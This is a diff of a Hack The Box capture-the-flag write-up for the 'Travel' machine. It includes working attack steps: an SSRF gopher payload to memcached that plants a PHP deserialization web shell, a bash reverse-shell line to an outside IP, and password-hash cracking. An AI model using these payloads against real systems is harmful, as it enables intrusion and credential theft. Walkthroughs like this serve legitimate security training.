@@ -1,10 +1,16 @@
+---
+description: >-
+  Zweilosec's writeup on the Hard difficulty Linux machine from
+  https://hackthebox.eu
+---
+
 # HTB - Travel
 
-## HTB - Machine\_Name
+## HTB - Travel
 
 ### Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/adbae3f0885540557096d47afd045b1b5e737947/linux-machines/hard/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-travel-infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -12,7 +18,7 @@ Short description to include any strange things to be dealt with
 
 **Useful thing 1**
 
-* Browse and edit ldap with Apache directory studio \(need link\)
+* Browse and edit LDAP with Apache Directory Studio \(need link\)
 
 **Useful thing 2**
 
@@ -59,19 +65,30 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
 ```
 
-ports 22, 80, 443 open
+The only ports that nmap showed as open on this machine were 22 \(SSH\), 80 \(HTTP\), and 443 \(HTTPS\). From the  nmap DNS NSE script scan I saw three virtual hosts for this IP: 
 
-From the DNS nmap NSE script scan we are given three virtual hosts for this IP: `Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb` - added all three to hosts file
+```text
+Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
+```
 
-www on port 80 hosts a "coming soon" site with potential user email format
+ I added all three to my `/etc/hosts` file so I could connect.
 
+![](../../.gitbook/assets/1-travel-site.png)
+
+Connecting to `www.travel.htb` I found a "coming soon"  type site with a countdown.  On this site I found a contact information section with a potential a user email format.
+
+```text
 CONTACT INFORMATION
-
 hello@travel.htb Park Ave, 987, London, United Kingdom.
+```
 
-discovered wordpress login page at [http://blog.travel.htb/wp-login.php](http://blog.travel.htb/wp-login.php) wappalyzer firefox plugin tells me WP is version 5.4
+![](../../.gitbook/assets/3-ssl-under-construction.png)
 
-`wpscan --url http://blog.travel.htb/ --enumerate`
+Checking port 443 only led to an under construction site with no useful information.
+
+![](../../.gitbook/assets/6-wappalyzer.png)
+
+The Firefox plugin `wappalyzer` told me the WordPress version was 5.4.  Since I now knew they were using WordPress I fired up `wpscan` to check the site for vulnerabilities using the syntax`wpscan --url http://blog.travel.htb/ --enumerate`.
 
 ```text
 robots.txt found: http://blog.travel.htb/robots.txt
@@ -98,16 +115,48 @@ robots.txt found: http://blog.travel.htb/robots.txt
  | Found By: Author Posts
 ```
 
-[http://www.travel.htb/newsfeed/customfeed.xml](http://www.travel.htb/newsfeed/customfeed.xml) - can see raw xml of the rss feed page
+![](../../.gitbook/assets/5-wp-login.png)
 
-found a git repo while scanning blog-dev with dirbuster used git-dumper [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper) to download the folder The dirbuster scan also shows some security has been put in place against automated scanners...see the repeated chain of /./ dirs
+I discovered a WordPress login page at `http://blog.travel.htb/wp-login.php`  but there was nothing else useful from the scan.
+
+![](../../.gitbook/assets/7-noluck-reset.png)
+
+I tried resetting my password since this version of WordPress was reportedly vunerable to information leakage through this, but it did not lead to anything useful.  
+
+![](../../.gitbook/assets/8-xmlrpc.png)
+
+The page at `xmlrpc.php` likewise did not seem to be useful at this time.
+
+![](../../.gitbook/assets/9-blog-dev.png)
+
+Navigating to the virtual host `blog-dev` also seemed to be a dead-end, though I started another Dirbuster scan to see if anything useful that I could access could be found. 
+
+![](../../.gitbook/assets/10-awesome-rss.png)
+
+There was an RSS feed using the Awesome RSS WordPress plugin on the `blog` site. In the source code of the page I noticed a section that said 'DEBUG\` which caught my eye.  I didn't know what to do with it, but it seemed interesting.
+
+![](../../.gitbook/assets/10-todo.png)
+
+There was also a section that talked about using "Additional CSS" and importing it from the `dev` site.  This seemed like a potential way to get code to cross domains.
+
+![](../../.gitbook/assets/11-feed-xml.png)
+
+Another interesting find was the raw XML output that feeds the RSS page.  Perhaps there was an XML deserialization vulnerability in the site.
+
+Since the `wpscan` results didn't seem to yield any useful information I checked out my Dirbuster scan of the `dev-blog` site and looked for interesting directories. 
+
+![](../../.gitbook/assets/10-dirbuster-git.png)
+
+I found a potentially accessible git repo while scanning `blog-dev` with dirbuster.  
+
+_The dirbuster scan also shows that some security has been put in place against automated scanners. I could see the repeated chain of /./ dirs that told me the scanner was stuck.  After telling it to ignore those directories it found the `git` directory._
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
 └─$ python3 ~/.local/bin/git-dumper/git-dumper.py http://blog-dev.travel.htb/ gitdump
 ```
 
-made a gitdump folder to dump the contents of the git repo;
+I made a gitdump folder to dump the contents of the git repo into and ran `git-dumper` \(from [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)\) to clone the repository.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/travel/gitdump]
@@ -137,7 +186,7 @@ drwxr-xr-x 7 zweilos zweilos 4096 Sep 18 20:21 objects
 drwxr-xr-x 3 zweilos zweilos 4096 Sep 18 20:21 ref
 ```
 
-The repository appears to be the source code for the Awesome RSS application we came across earlier. The README.md file explains the progress of the project so far.
+The repository appeared to be the source code for the Awesome RSS application I saw earlier. The `README.md` file explained the status of the project.
 
 ```text
 # Rss Template Extension
@@ -163,9 +212,13 @@ Allows rss-feeds to be shown on a custom wordpress page.
 - finish logging implementation
 ```
 
-Insert pictures ... code examples showing memcache and possible IPS / WAF implementation
+![](../../.gitbook/assets/12-memcache.png)
+
+
 
 The php has a `get_feed()` function, which takes in a URL and then gets its contents using `url_get_contents` . It then creates a SimplePie object and sets its cache to a local memcache instance. SimplePie is a WordPress plugin that allows for RSS feeds in php-based sites. . Feeds are requested from the `custom_feed_url` parameter if it exists, otherwise it defaults to `http://www.travel.htb/newsfeed/customfeed.xml` which I found earlier through dirbuster.
+
+![](../../.gitbook/assets/13-ips.png)
 
 > In the file template.php we find the url\_get\_contents function defined here. It uses the safe method to check if the URL is valid or not. If valid, curl is used to request the resource and return its contents. The filter blocks the file:// URI scheme, however we can still use various other protocols such as gopher . We also see it blocking access to localhost and 127.0.0.1 . However, this can be easily bypassed by converting the IP address to its decimal notation. This will let us perform Server Side Request Forgery \(SSRF\) attacks and communicate with internally hosted resources. Also, The init\(\) method uses the file\_put\_contents\(\) function to write data to a log file. This is method is called from the **construct and** wakeup functions. These are known as magic methods in PHP, which are invoke when certain actions are taken. For example, the \_\_wakeup method is called when an object of that class is deserialized. Let's keep this in mind and move on.
 >
@@ -332,15 +385,15 @@ final url - the length of the contents is important! make sure it is correct \(1
 http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:13:%22back_door.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27test%27%5D%29%3B%3F%3E%22%3B%7D%0d%0a
 ```
 
-HAVE TO decimal/hex encode 127.0.0.1~~~!!! 2130706433 or 0x7f000001 and add xct\_ a shell can be obtained by using:
+HAVE TO decimal/hex encode 127.0.0.1~~~!!! 2130706433 or 0x7f000001 and add xct\_ a shell can be obtained by using parameter:
 
 ```text
-curl -G http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php --data-urlencode 'test=bash -c "bash -i >& /dev/tcp/10.10.15.53/8099 0>&1"'
+test=bash -c "bash -i >& /dev/tcp/10.10.15.53/8099 0>&1"
 ```
 
 `xct_4e5612ba079c530a6b1f148c0b352241`
 
-### Initial Foothold
+### Initial Foothold - `www-data`
 
 ```text
 www-data@blog:/var/www/html$ ls -la
@@ -389,7 +442,7 @@ In the `/opt/wordpress` directory found and extracted a .sql file to my home mac
 
 picture
 
-It was a sqldump output file rather than an actual database, but contained all of the recent queries to the database, found password hashes for an admin user and lynik-admin\` , loading in hash-dentifier to check what type of hash then loaded to crack with hashcat
+It was a sqldump output file rather than an actual database, but contained all of the recent queries to the database, found password hashes for an `admin` user and `lynik-admin` , loading in hash-identifier to check what type of hash then loaded to crack with hashcat
 
 ```text
 INSERT INTO `wp_users` VALUES
@@ -422,7 +475,7 @@ Possible Hashs:
 --------------------------------------------------
 ```
 
-[https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/](https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/) tells me the correct hashtype to use is m=400
+[https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/](https://scottlinux.com/2013/04/23/crack-wordpress-password-hashes-with-hashcat-how-to/) tells me the correct hash type to use for hashcat is m=400
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/travel]
